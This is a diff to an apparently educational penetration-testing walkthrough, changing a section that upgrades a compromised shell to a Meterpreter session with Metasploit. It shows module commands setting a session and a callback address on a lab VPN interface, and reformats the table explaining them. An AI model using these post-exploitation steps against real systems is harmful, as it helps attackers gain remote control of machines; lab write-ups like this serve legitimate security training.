@@ -1000,17 +1000,15 @@ msf post(multi/manage/shell_to_meterpreter) >
 sessions
 set SESSION 1
 set LHOST 192.168.134.39
-run
 ```
 
 **Breakdown**
 
-|Component|Purpose|
-|---|---|
-|`sessions`|Lists active sessions to confirm the target shell's ID before setting it. Here the shell is session 1.|
-|`set SESSION 1`|Points the module at the backgrounded shell.|
-|`set LHOST 192.168.134.39`|Sets the callback to the `tun0` address, overriding the unreliable auto-detect.|
-|`run`|Executes. `exploit` is aliased.|
+| Component                  | Purpose                                                                                                |
+| -------------------------- | ------------------------------------------------------------------------------------------------------ |
+| `sessions`                 | Lists active sessions to confirm the target shell's ID before setting it. Here the shell is session 1. |
+| `set SESSION 1`            | Points the module at the backgrounded shell.                                                           |
+| `set LHOST 192.168.134.39` | Sets the callback to the `tun0` address, overriding the unreliable auto-detect.                        |
 
 **Result**
 
